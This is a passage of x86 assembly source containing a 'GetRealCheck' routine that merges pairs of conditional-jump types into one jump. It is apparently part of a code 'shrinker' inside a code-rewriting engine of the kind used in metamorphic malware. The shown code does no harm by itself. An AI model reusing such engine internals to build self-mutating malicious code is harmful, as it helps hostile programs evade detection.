;;      = 0FFh if no direct flag can be used
;; This function only tests the flags that are coded by this engine (not all
;; the possible types).
;;
;; Checks can be merged as:
;;
;; X(even) + X+1 = JMP(unconditional)
;; NB(3) + E(4) = NB(3)
;; NB(3) + A(7) = NB(3)
;; E(4) + A(7) = NB(3)
;;
;; B(2) + A(7) = NE(5)
;; B(2) + NE(5) = NE (5)
;; NE(5) + A(7) = NE(5)
;;
;; B(2) + E(4) = BE(6)
;; B(2) + BE(6) = BE(6)
;; E(4) + BE(6) = BE(6)
;;
;; NB(3) + BE(6) = JMP(unconditional)
;; NE(5) + BE(6) = JMP (unconditional)


GetRealCheck    proc
                              cmp       eax, ebx
                              jb        @@1
                              mov       ecx, ebx
                              mov       edx, eax
                              jmp       @@2
                        @@1:  mov       ecx, eax
                              mov       edx, ebx
                        @@2:  test      ecx, 1    ; ECX <= EDX
                              jnz       NoUnconditional
                              sub       edx, 1    ; If Jcc1 == 7x and Jcc2 == 7x+1, it's an
                              cmp       ecx, edx  ; unconditional JMP (for example,
                              jz        UnconditionalJump ; opcodes 74h/75h (JZ/JNZ), etc.
                              add       edx, 1
NoUnconditional:
                              cmp       ecx, edx  ; If Jcc1 == Jcc2, the result is the same Jcc
                              jz        ReturnCurrent
                              cmp       ecx, 2    ; JB?
                              jz        Check2_x
                              cmp       ecx, 3    ; JAE?
                              jz        Check3_x
                              cmp       ecx, 4    ; JZ?
                              jz        Check4_x
                              cmp       ecx, 5    ; JNZ?
                              jnz       NoOption
        ;; Check merge with JNZ
Check5_x:
                              cmp       edx, 7    ; JNZ + JA?
                              jz        SetNE     ;   Then, set JNZ
                              cmp       edx, 6    ; JNZ + JBE?
                              jz        UnconditionalJump ; Then, set JMP (unconditional)
                              jmp       NoOption  ; If there isn't any of these options, it
                                                ; can't be compressed
                  ;; Check merge with JB
Check2_x:
                              cmp       edx, 4    ; If 2nd < 4, it can't be compressed
                              jb        NoOption
                              cmp       edx, 7    ; If 2nd > 7, it can't be compressed
                              ja        NoOption
                              test      edx, 1    ; JB + JNZ/JA = JNZ
                              jnz       SetNE
                              jmp       SetBE     ; JB + JZ/JBE = JBE

                  ;; Check merge with JAE
Check3_x:
                              cmp       edx, 4    ; JAE + JZ = JAE
                              jz        SetNB
                              cmp       edx, 7    ; JAE + JA = JAE
                              jz        SetNB
                              cmp       edx, 6    ; JAE + JBE = JMP
                              jz        UnconditionalJump
                              jmp       NoOption  ; Others can't be compressed

                  ;; Check merge with JZ
Check4_x:
                              cmp       edx, 6    ; JZ + JBE = JBE
                              jz        SetBE
                              cmp       edx, 7    ; JZ + JA = JAE/JNB
                              jnz       NoOption
                        ;  jmp   @@SetNB

SetNB:                        mov       eax, 3    ; Set JAE
                              ret
SetNE:                        mov       eax, 5    ; Set JNZ
                              ret
SetBE:                        mov       eax, 6    ; Set JBE
                              ret
NoOption:
                              mov       eax, 0FFh ; Set "no compression"
ReturnCurrent:
                              ret
UnconditionalJump:
                              mov       eax, 79h  ; Set JMP
                              ret
GetRealCheck    endp

;
;
; End of shrinker
;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; ********************************************************************** ;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;